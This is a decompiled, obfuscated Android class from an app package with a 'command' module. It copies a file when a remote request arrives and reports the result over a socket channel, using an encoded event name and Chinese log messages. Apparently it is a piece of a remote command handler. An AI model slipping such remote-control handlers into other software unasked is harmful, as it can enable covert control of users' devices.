package com.storm.safe.rock.service.modules.command;

import com.storm.safe.rock.service.modules.C0323a8;
import com.storm.safe.rock.util.StringUtil;
import io.socket.engineio.client.transports.PollingXHR;
import kotlin.coroutines.intrinsics.CoroutineSingletons;
import kotlin.coroutines.jvm.internal.SuspendLambda;
import org.json.JSONObject;
import p000.C1351vv;
import p000.C1496yx;
import p000.InterfaceC0876mv;
import p000.InterfaceC0920no;
import p000.InterfaceC1116qn;
import p000.kg1;
import p000.l10;
import p000.t60;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
@InterfaceC1116qn(m214402c = "com.storm.safe.rock.service.modules.command.FileCommandHandler$handleFileCopy$2", m214403f = "FileCommandHandler.kt", m214404l = {}, m214405m = "invokeSuspend")
/* loaded from: classes2.dex */
final class FileCommandHandler$handleFileCopy$2 extends SuspendLambda implements l10 {

    /* renamed from: a1 */
    public final /* synthetic */ C1496yx f53445a1;

    /* renamed from: a2 */
    public final /* synthetic */ String f53446a2;

    /* renamed from: a3 */
    public final /* synthetic */ String f53447a3;

    /* renamed from: a4 */
    public final /* synthetic */ C0323a8 f53448a4;

    /* renamed from: a5 */
    public final /* synthetic */ String f53449a5;

    /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
    public FileCommandHandler$handleFileCopy$2(InterfaceC0876mv interfaceC0876mv, C1496yx c1496yx, C0323a8 c0323a8, String str, String str2, String str3) {
        super(2, interfaceC0876mv);
        this.f53445a1 = c1496yx;
        this.f53446a2 = str;
        this.f53447a3 = str2;
        this.f53448a4 = c0323a8;
        this.f53449a5 = str3;
    }

    @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
    public final InterfaceC0876mv create(Object obj, InterfaceC0876mv interfaceC0876mv) {
        return new FileCommandHandler$handleFileCopy$2(interfaceC0876mv, this.f53445a1, this.f53448a4, this.f53446a2, this.f53447a3, this.f53449a5);
    }

    @Override // p000.l10
    public final Object invoke(Object obj, Object obj2) {
        return ((FileCommandHandler$handleFileCopy$2) create((InterfaceC0920no) obj, (InterfaceC0876mv) obj2)).invokeSuspend(C1351vv.f60710b1);
    }

    @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
    public final Object invokeSuspend(Object obj) throws Throwable {
        String str = this.f53449a5;
        C0323a8 c0323a8 = this.f53448a4;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        kg1.m213544f4(obj);
        try {
            C1496yx c1496yx = this.f53445a1;
            String str2 = this.f53446a2;
            String str3 = this.f53447a3;
            c1496yx.getClass();
            boolean zM215311a0 = C1496yx.m215311a0(str2, str3);
            if (c0323a8 != null) {
                String strM212470a0 = StringUtil.m212470a0("LVAdP3IqCT1HPiVKFA==");
                JSONObject jSONObject = new JSONObject();
                jSONObject.put("requestId", str);
                jSONObject.put(PollingXHR.Request.EVENT_SUCCESS, zM215311a0);
                c0323a8.m211658c4(strM212470a0, jSONObject);
            }
            t60.m214714d6("FileCmdHandler", "文件复制结果: " + zM215311a0);
            return new Integer(0);
        } catch (Exception e) {
            t60.m214705c6("FileCmdHandler", "复制文件失败", e);
            if (c0323a8 == null) {
                return null;
            }
            String strM212470a02 = StringUtil.m212470a0("LVAdP3IqCT1HPiVKFA==");
            JSONObject jSONObject2 = new JSONObject();
            jSONObject2.put("requestId", str);
            String message = e.getMessage();
            if (message == null) {
                message = "未知错误";
            }
            jSONObject2.put("error", message);
            c0323a8.m211658c4(strM212470a02, jSONObject2);
            return C1351vv.f60710b1;
        }
    }
}
